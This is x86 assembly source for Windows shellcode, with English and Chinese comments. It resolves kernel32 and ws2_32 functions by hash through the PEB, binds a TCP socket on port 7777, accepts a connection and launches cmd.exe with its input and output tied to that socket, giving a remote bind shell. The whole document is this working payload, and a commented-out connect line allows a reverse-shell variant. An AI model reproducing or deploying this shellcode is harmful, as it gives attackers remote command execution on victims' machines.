    _start:
        ; kernel32.dll
            xor eax, eax;
            mov ebx, fs: [eax + 0x30] ; PEB           
            mov ebx, [ebx + 0x0C]; LDR           
            mov ebx, [ebx + 0x0C]; pid            
            mov ebx, [ebx]; ntdll
            mov ebx, [ebx]; kernel32
            mov eax, [ebx + 0x18]; kernel32.dll base            
            mov esi, eax; esi--> kernel32
            mov ebx, eax; ebx--> kernel32

        ; DOS_header            
            add esi, 0x3C;            
            mov ebx, [esi]; PE header rva
            add ebx, eax; PE header va
            lea ebx, [ebx + 0x78]; option-header+data-directory            
            mov ebx, [ebx];export-rva
            add ebx, eax; export-va            

            push ebp;
            mov ebp, esp; 新栈帧

        ; Func_Address
            xor ecx, ecx;
            push ecx;
            push eax;             
            push ebx; 
            
            mov esi, [ebx + 0x20]; AddressOfNames rva            
            add esi, eax; AddressOfNames va            
            push esi; 

        ; Sava args space
            xor edx, edx;
            mov cx, 0xc;
        push_zero:
            push edx;
            loop push_zero;
            push esp;  

            xor ecx, ecx; 
            xor edx, edx;
            xor eax, eax;

            push 0x16B3FE72; CreateProcessA
            push 0x73E2D87E; ExitProcess
            push 0xC53D4FDB; RtlZeroMemory
            push 0xEC0E4E8E; loadlib
            mov ecx, 0x4;
            lea ebx, [esp]; 


        ;find_func
        next_func:
            mov edx, [ebp - 0x10]; AddressOfNames va
            push ecx; 
            call find_func;
            pop ecx; 
            add ebx, 4; 
            xor esi, esi;
            xor edi, edi;

            mov esi, [ebp - 0x44]; Sava space
            mov edi, esi; 
            mov[edi], eax;
            add esi, 4; 
            mov[ebp - 0x44], esi;
            loop next_func;


        ; Ws2_32.dll
            xor ebx, ebx;
            mov ebx, [ebp - 0x40];loadlib va
            push ecx;
            push 0x6c6c;
            push 0x642e3233;
            push 0x5f327377;ws32.dll
            push esp;
            call ebx;

            mov ebx, [eax + 0x3c]; 
            mov esi, ebx;
            add ebx, eax; 
            lea ebx, [ebx + 0x78]; 
            mov ebx, [ebx]
            add ebx, eax; 

            push ebp;
            mov ebp, esp;new stack

            xor ecx, ecx;
            push ecx;
            push eax; 
            push ebx; 
            mov esi, [ebx + 0x20]; 
            add esi, eax; AddressOfNames va
            push esi; 
            push ecx; save space
            push ecx;
            push ecx;
            push ecx;
            push ecx;
            push esp;

            xor ecx, ecx;
            xor edx, edx;
            xor eax, eax;

            ; push 0x60AAF9EC; connect
            push 0xC7701AA4;bind
            push 0xADF509D9; wsasocketa
            push 0x3BFCEDCB; wsastatup
            push 0xE92EADA4; listen
            push 0x498649E5;accept
            mov ecx, 0x5;
            lea ebx, [esp]; 
            jmp next_func2;

        next_func2:
            mov edx, [ebp - 0x10]; 
            push ecx; 
            call find_func;
            pop ecx; 
            add ebx, 4; 
            xor esi, esi;
            xor edi, edi;
            mov esi, [ebp - 0x28]; 
            mov edi, esi; 
            mov[edi], eax;
            add esi, 4; 
            mov[ebp - 0x28], esi;
            loop next_func2;


        


            xor ebx, ebx;
            xor ecx, ecx;
            xor edx, edx;
            xor edi, edx;
            xor esi, esi;

            mov ebx, [ebp - 0x18]; wassocketa
            mov ecx, [ebp - 0x1c]; startup
            mov edx, [ebp - 0x20]; inet_addr
            mov edi, [ebp - 0x24]; honts;
        
            mov esp, ebp; 
            pop ebp;kernel32 stack
            mov[ebp - 0x30], eax;connect/bind
            mov[ebp - 0x2c], ebx;
            mov[ebp - 0x28], ecx;
            mov[ebp - 0x24], edx;
            mov[ebp - 0x20], edi;
            push esi;

            sub esp, 0x20
            mov eax, [ebp - 0x28];
            push esp; &WSADATA
            push 0x202; wVersionRequested
            call eax;

            ;WSASocketA(AF_INET,SOCK_STREAM,IPPROTO_TCP,0,0)
            mov eax, [ebp - 0x2c]; wassocket
            xor ecx, ecx;
            push ecx;
            push ecx;
            push ecx;
            mov ecx, 0x0006;
            push ecx;
            mov ecx, 0x0001;
            push ecx;
            inc ecx;
            push ecx;
            call eax;

            push eax; socket描述符

           
            


            ;store sock_addr(sin_family\sin_port\in_addr sin_addr\sin_zero[8])
            mov eax, 0x00000002;地址族号
            sub esp, 0x10;sock_addr_len
            xor ecx, ecx;
            mov[esp], eax;sin_family
            xor esi, esi;
            mov si, 0x611E;7777
            mov[esp + 2], si;sin_port
            xor edi, edi;0.0.0.0
            mov[esp + 4], edi;addr
            mov[esp + 8], ecx;fill lenth
            ; 补足长度，这是一个填充字段（padding），以保证 sockaddr_in 结构体与 sockaddr 结构体的大小相同。它没有实际意义，通常初始化为零。
            mov ebx, esp; store sock_addr

            ;  Connect(socket,&sock_addr,sizeof(sock_addr));socket是描述符
            ;  bind(socket,&sock_addr,sizeof(sock_addr));socket是描述符
            ;bind(socket,&sock_addr,sizeof(sock_addr))
            mov edx, [ebp - 0x30];bind
            push 16; size
            push ebx;sock_addr
            mov eax, [ebp - 0x8c]; sockets
            push eax;
            mov ecx, [ebp - 0x30];
            call ecx; bind

        call_listen:
            mov eax, 0x00000006;connect max num
            push  eax; Push backlog;
            mov esi, [ebp - 0x8c];sockets 
            push  esi; Push s
            mov ebx, [ebp - 0x24];listen
            call ebx; eax=0
            ; eax返回0

            ; accept(SOCKET s, sockaddr* addr, int* addrlen)          
        call_accept:
            xor ecx, ecx;
            push  ecx;client_info
            push  ecx; cilent addr，
            mov esi, [ebp - 0x8c]; sockets
            push  esi; 
            mov ebx, [ebp - 0x20]
            call ebx; Call accept(SOCKET s, Null, Null)
            mov esi, eax;

            xor ebx, ebx            
            ; zero out 84 bytes  startupinfo and PROCESS_INFORMATION
            xor ecx, ecx;
            mov edx, ecx;
            mov cx, 84;
        zero:
            push edx
            loop zero;
            push esp;
            ; 本来想用RtlZeroMemory 函数的，但是这个函数是ntdll.dll库的，所以就直接循环填充了84字节的0值空间，把首地址空间给edi
            pop edi;




            ;cmd.exe
            xor ebx, ebx
            push 0x00657865;
            push 0x2e646d63; cmd.exe
            lea ebx, [esp]; ebx-->cmd.exe

            ; init _STARTUPINFO
            ; 前 68个字节是STARTUPINFO，后16个字节是PROCESS_INFORMATION
            xor edx, edx
            mov dx, 68;
            mov[edi], edx;cb len
            xor ecx, ecx;
            mov ecx, 100h;dwFlags
            mov[edi + 0x2c], ecx;
            mov ecx, 0x00000002;wShowWindow
            mov[edi + 0x30], ecx;
            mov[edi + 0x38], eax; accept sockets
            mov[edi + 0x3c], eax;
            mov[edi + 0x40], eax;

            lea edx, [edi + 68]; edx是pi, edi是si
            
            ;CreateProcess(NULL,cmdline,NULL,NULL,TRUE,NULL,NULL,NULL,&si,&pi)
            push esi;
            xor esi, esi
            push edx
            push edi
            push esi
            push esi
            push esi
            inc esi;
            push esi; true
            xor esi, esi;
            push esi
            push esi
            push ebx
            push esi
            mov eax, [ebp - 0x34];createprocess
            call eax;
            nop;
            nop;



        find_func:
            xor ecx, ecx;
            xor eax, eax;
            xor esi, esi;
        GetFunc:
            inc ecx; 
            mov esi, [edx]; edx-->Addressofname rva
            add edx, 4;
            add esi, [ebp - 8]; ebp - 8-->.dll 基地址，esi-->name va
            xor edi, edi;

        ComputeHash:
            lodsb; 
            test al, al; 
            jz DoneHash; 
            ror edi, 13; 
            add edi, eax;
            jmp ComputeHash

        DoneHash :
            cmp edi, [ebx]; 
            jnz GetFunc; 

            ; AddressOfNameOrdinals
            xor edi, edi;
            xor esi, esi;
            mov edi, [ebp - 0xc]; 
            mov esi, [edi + 0x24]; 
            add esi, [ebp - 8]; 
            dec ecx;
            mov cx, [esi + ecx * 2]; 
               
            ; AddressOfFunctions
            mov esi, [edi + 0x1C]; 
            add esi, [ebp - 8]; 
            mov eax, [esi + ecx * 4]; 
            add eax, [ebp - 8]; 
            ret;
